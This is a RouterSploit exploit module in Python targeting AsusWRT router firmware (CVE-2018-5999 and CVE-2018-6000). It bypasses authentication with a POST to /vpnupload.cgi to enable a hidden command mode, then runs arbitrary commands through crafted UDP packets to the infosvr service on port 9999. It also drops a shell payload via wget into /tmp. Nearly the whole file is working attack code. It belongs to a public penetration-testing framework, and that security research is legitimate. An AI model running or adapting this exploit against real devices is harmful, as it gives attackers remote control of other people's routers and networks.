from struct import pack, unpack
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
from routersploit.core.udp.udp_client import UDPClient


class Exploit(HTTPClient, UDPClient):
    __info__ = {
        "name": "AsusWRT Lan RCE",
        "description": "Module exploits multiple vulnerabilities to achieve remote code execution in AsusWRT firmware. "
                       "The HTTP server contains vulnerability that allows bypass authentication via POST requests. "
                       "Combining this with another vulnerability in the VPN configuration upload functionality allows "
                       "setting NVRAM configuration variables directly from the POST request. By setting nvram variable "
                       "ateCommand_flag to 1 it is possible to enable special command mode which allows executing commands "
                       "via infosvr server listening on port UDP 9999. Module was tested on Asus RT-AC68U 3.0.0.4.380_7378.",
        "authors": (
            "Pedro Ribeiro <pedrib@gmail.com>",  # vulnerability discovery and metasploit module
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2018-5999",
            "https://nvd.nist.gov/vuln/detail/CVE-2018-6000",
            "https://blogs.securiteam.com/index.php/archives/3589",
            "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/asuswrt-lan-rce.txt",
            "http://seclists.org/fulldisclosure/2018/Jan/78",
        ),
        "devices": (
            "AsusWRT < v3.0.0.4.384.10007",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    infosvr_port = OptPort(9999, "Target InfoSVR Port")

    def run(self):
        response = self.http_request(
            method="POST",
            path="/vpnupload.cgi",
            files={"ateCommand_flag": "1"},
        )

        if response and response.status_code == 200:
            print_success("Successfuly set ateCommand_flag variable")
        else:
            print_error("Failed to set ateCommand_flag variable")
            return

        shell(self, architecture="armle", method="wget", location="/tmp")

    def execute(self, cmd):
        ibox_comm_pkt_hdr_ex = (
            pack("<B", 0x0c) +                      # NET_SERVICE_ID_IBOX_INFO 0xC
            pack("<B", 0x15) +                      # NET_PACKET_TYPE_CMD 0x15
            pack("<H", 0x33) +                      # NET_CMD_ID_MANU_CMD 0x33
            bytes(utils.random_text(4), "utf-8") +  # INFO
            bytes(utils.random_text(6), "utf-8") +  # MAC Address
            bytes(utils.random_text(32), "utf-8")   # Password
        )

        cmd = bytes(cmd, "utf-8") + pack("<B", 0x00)
        pkt_syscmd = (
            pack("<H", len(cmd)) +
            cmd
        )

        payload = ibox_comm_pkt_hdr_ex + pkt_syscmd + bytes(utils.random_text(512 - len(ibox_comm_pkt_hdr_ex + pkt_syscmd)), "utf-8")

        udp_client = self.udp_create(port=self.infosvr_port)
        udp_client.send(payload)
        response = udp_client.recv(512)
        udp_client.close()

        if response and len(response) == 512:
            length = unpack('<H', response[14:16])[0]
            return str(response[16: 16 + length], "utf-8")

        return ""

    @mute
    def check(self):
        return None
